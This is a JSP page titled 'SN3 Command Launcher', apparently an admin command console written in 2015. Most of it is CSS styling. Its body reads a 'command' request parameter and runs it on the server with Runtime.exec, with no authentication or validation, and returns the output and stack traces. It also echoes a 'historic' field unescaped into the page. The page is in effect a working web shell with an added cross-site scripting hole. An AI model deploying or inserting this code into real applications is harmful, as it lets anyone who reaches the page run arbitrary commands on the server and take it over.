<%--
  Document : sn3CommandConsole.jsp
  Created on : 2015
  Author : Er Lino
  Utilidad: consola de comandos
   
 --%>
 
 <%@page contentType="text/html; charset=UTF-8"%>
 
 <%@ page import="java.io.BufferedInputStream" %>
<%@ page import="java.io.ByteArrayInputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.File" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.FileInputStream" %>
<%@ page import="java.io.FileNotFoundException" %>
<%@ page import="java.io.FileOutputStream" %>
<%@ page import="java.io.FileWriter" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.OutputStream" %>
<%@ page import="java.io.OutputStreamWriter" %>
<%@ page import="java.io.Reader" %>
<%@ page import="java.io.UnsupportedEncodingException" %>
<%@ page import="javax.xml.transform.Result" %>
<%@ page import="javax.xml.transform.Source" %>
<%@ page import="javax.xml.transform.Templates" %>
<%@ page import="javax.xml.transform.Transformer" %>
<%@ page import="javax.xml.transform.TransformerFactory" %>
<%@ page import="javax.xml.transform.sax.SAXResult" %>
<%@ page import="javax.xml.transform.stream.StreamResult" %>
<%@ page import="javax.xml.transform.stream.StreamSource" %>
<%@ page import="java.net.URL" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.util.Enumeration" %>
<%@ page import="java.util.Properties" %>
<%@ page import="java.net.InetAddress" %>
<%@ page import="java.nio.charset.Charset" %>
<%@ page import="java.lang.Runtime" %>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	
<title>SN3 Command Launcher</title>


	
<style type="text/css"> 
body {
	font: normal .8em/1.5em Arial, Helvetica, sans-serif;
	background: #ebebeb;
	width: 100%;
	margin: 0px auto;
	color: #666;
}
a {
	color: #333;
}
#nav {
	margin: 0;
	padding: 7px 6px 0;
	line-height: 100%;
	border-radius: 2em;
 
	-webkit-border-radius: 2em;
	-moz-border-radius: 2em;
	
	-webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, .4);
	-moz-box-shadow: 0 1px 3px rgba(0, 0, 0, .4);
 
	background: #8b8b8b; /* for non-css3 browsers */
	filter:  progid:DXImageTransform.Microsoft.gradient(startColorstr='#a9a9a9', endColorstr='#7a7a7a'); /* for IE */
	background: -webkit-gradient(linear, left top, left bottom, from(#a9a9a9), to(#7a7a7a)); /* for webkit browsers */
	background: -moz-linear-gradient(top,  #a9a9a9,  #7a7a7a); /* for firefox 3.6+ */
 
	border: solid 1px #6d6d6d;
}
#nav li {
	margin: 0 5px;
	padding: 0 0 8px;
	float: left;
	position: relative;
	list-style: none;
}
/* main level link */
#nav a {
	font-weight: bold;
	color: #e7e5e5;
	text-decoration: none;
	display: block;
	padding:  8px 20px;
	margin: 0;
	-webkit-border-radius: 1.6em;
	-moz-border-radius: 1.6em;
	text-shadow: 0 1px 1px rgba(0, 0, 0, .3);
}
/* main level link */
#nav select {
	font-weight: bold;
	color: #e7e5e5;
	text-decoration: none;
	display: block;
	padding:  8px 20px;
	margin: 0;
	-webkit-border-radius: 1.6em;
	-moz-border-radius: 1.6em;
	text-shadow: 0 1px 1px rgba(0, 0, 0, .3);
}
/* main level link hover */
#nav .current a, #nav li:hover > a {
	background: #d1d1d1; /* for non-css3 browsers */
	filter:  progid:DXImageTransform.Microsoft.gradient(startColorstr='#ebebeb', endColorstr='#a1a1a1'); /* for IE */
	background: -webkit-gradient(linear, left top, left bottom, from(#ebebeb), to(#a1a1a1)); /* for webkit browsers */
	background: -moz-linear-gradient(top,  #ebebeb,  #a1a1a1); /* for firefox 3.6+ */
 
	color: #444;
	border-top: solid 1px #f8f8f8;
	-webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, .2);
	-moz-box-shadow: 0 1px 1px rgba(0, 0, 0, .2);
	box-shadow: 0 1px 1px rgba(0, 0, 0, .2);
	text-shadow: 0 1px 0 rgba(255, 255, 255, .8);
}
#nav .currentblue a, #nav li:hover > a {
	background: #d1d1d1; /* for non-css3 browsers */
	filter:  progid:DXImageTransform.Microsoft.gradient(startColorstr='#ebebeb', endColorstr='#a1a1a1'); /* for IE */
	background: -webkit-gradient(linear, left top, left bottom, from(#ebebeb), to(#a1a1a1)); /* for webkit browsers */
	background: -moz-linear-gradient(top,  #ebebeb,  #a1a1a1); /* for firefox 3.6+ */
 
	color: #44f;
	border-top: solid 1px #f8f8f8;
	-webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, .2);
	-moz-box-shadow: 0 1px 1px rgba(0, 0, 0, .2);
	box-shadow: 0 1px 1px rgba(0, 0, 0, .2);
	text-shadow: 0 1px 0 rgba(255, 255, 255, .8);
}
/* sub levels link hover */
#nav ul li:hover a, #nav li:hover li a {
	background: none;
	border: none;
	color: #666;
	-webkit-box-shadow: none;
	-moz-box-shadow: none;
}
#nav ul a:hover {
	background: #0399d4 !important; /* for non-css3 browsers */
	filter:  progid:DXImageTransform.Microsoft.gradient(startColorstr='#04acec', endColorstr='#0186ba'); /* for IE */
	background: -webkit-gradient(linear, left top, left bottom, from(#04acec), to(#0186ba)) !important; /* for webkit browsers */
	background: -moz-linear-gradient(top,  #04acec,  #0186ba) !important; /* for firefox 3.6+ */
 
	color: #fff !important;
	-webkit-border-radius: 0;
	-moz-border-radius: 0;
	text-shadow: 0 1px 1px rgba(0, 0, 0, .1);
}
/* level 2 list */
#nav ul {
	background: #ddd; /* for non-css3 browsers */
	filter:  progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff', endColorstr='#cfcfcf'); /* for IE */
	background: -webkit-gradient(linear, left top, left bottom, from(#fff), to(#cfcfcf)); /* for webkit browsers */
	background: -moz-linear-gradient(top,  #fff,  #cfcfcf); /* for firefox 3.6+ */
 
	display: none;
	margin: 0;
	padding: 0;
	width: 185px;
	position: absolute;
	top: 35px;
	left: 0;
	border: solid 1px #b4b4b4;
	-webkit-border-radius: 10px;
	-moz-border-radius: 10px;
	border-radius: 10px;
	-webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, .3);
	-moz-box-shadow: 0 1px 3px rgba(0, 0, 0, .3);
	box-shadow: 0 1px 3px rgba(0, 0, 0, .3);
}
/* dropdown */
#nav li:hover > ul {
	display: block;
}
#nav ul li {
	float: none;
	margin: 0;
	padding: 0;
}
#nav ul a {
	font-weight: normal;
	text-shadow: 0 1px 1px rgba(255, 255, 255, .9);
}
/* level 3+ list */
#nav ul ul {
	left: 181px;
	top: -3px;
}
/* rounded corners for first and last child */
#nav ul li:first-child > a {
	-webkit-border-top-left-radius: 9px;
	-moz-border-radius-topleft: 9px;
	-webkit-border-top-right-radius: 9px;
	-moz-border-radius-topright: 9px;
}
#nav ul li:last-child > a {
	-webkit-border-bottom-left-radius: 9px;
	-moz-border-radius-bottomleft: 9px;
	-webkit-border-bottom-right-radius: 9px;
	-moz-border-radius-bottomright: 9px;
}
/* clearfix */
#nav:after {
	content: ".";
	display: block;
	clear: both;
	visibility: hidden;
	line-height: 0;
	height: 0;
}
#nav {
	display: inline-block;
}
html[xmlns] #nav {
	display: block;
}
* html #nav {
	height: 1%;
}
</style>
<script>
function ejecutar(){

	 var form = document.createElement("form");
	 form.setAttribute("method", "POST");
	
	 var hiddenField = document.createElement("input");
	  hiddenField.setAttribute("type", "hidden");
	  hiddenField.setAttribute("name", "command");
	  hiddenField.setAttribute("value", this.command.value);
	  form.appendChild(hiddenField);
	  
	  hiddenField = document.createElement("input");
	  hiddenField.setAttribute("type", "hidden");
	  hiddenField.setAttribute("name", "historic");
	  hiddenField.setAttribute("value", this.historic.value);
	  form.appendChild(hiddenField);	 
	  
      document.body.appendChild(form);
      form.submit();	
}
</script>
</head>

<body>
<%

    InetAddress host = null;
    host = InetAddress.getLocalHost();
    String nombreHost=host.getHostName();


	%><h3>SN3 COMMAND LAUNCHERS - CLON <%=nombreHost%> </h3><%

	String command = (String) request.getParameter("command");if (command == null) command = "";
	String historic = (String) request.getParameter("historic");if (historic == null) historic = "";
	historic = command + "\n" + historic;
	
	%>
	<h5>Command</h5>
	<h5>>><input type="text" size="200" name="command" value=""></input><button id="ejecutar" onclick="javascript:ejecutar()">Launch!</button></h5>
	<h5>Historic</h5>
	<h5><textarea id="historic" rows="10" cols="165"><%=historic%></textarea></h5>
	<%
	
	 if ((command!=null) && (!command.trim().equals("")))
	 {
	 try
	 {
	 Process ps = null;
	 ps = Runtime.getRuntime().exec(command);
	 ps.waitFor();
	 
	 int exitValue=ps.exitValue();
	  InputStream in=null;
	  
	 if (exitValue==0)
	 {
	   in = ps.getInputStream();
	 }
	 else
	 {
	   in = ps.getErrorStream();
	 }
	 
	int c;
	String salida = "";
	while ((c=in.read()) != -1)
	{
		salida = salida + (char) c;
	}
	
	if (exitValue==0)
	{
	%><h5 style="border-style:inset;text-align:center;color:white;background-color:green">SUCCESS</h5><%
	}
	else
	{
	%><h5 style="border-style:inset;text-align:center;color:white;background-color:red">ERROR</h5><%	
	}
	
	%><h5><textarea id="XML3333" rows="10" cols="165"><%=salida%></textarea></h5><%
	}
	catch (Exception e2)
	{
	        %><h5 style="border-style:inset;text-align:center;color:white;background-color:red">EXCEPTION</h5><%
			e2.printStackTrace();
			StackTraceElement[] elements2 = e2.getStackTrace();
			String salidaError = "";
			for(int i=0; i<elements2.length; i++) {
				salidaError = salidaError + elements2[i];
			}  	
			%><h5><textarea id="XML33334" rows="10" cols="165"><%=salidaError%></textarea></h5><%
	}
	}
%>

</body>
</html>	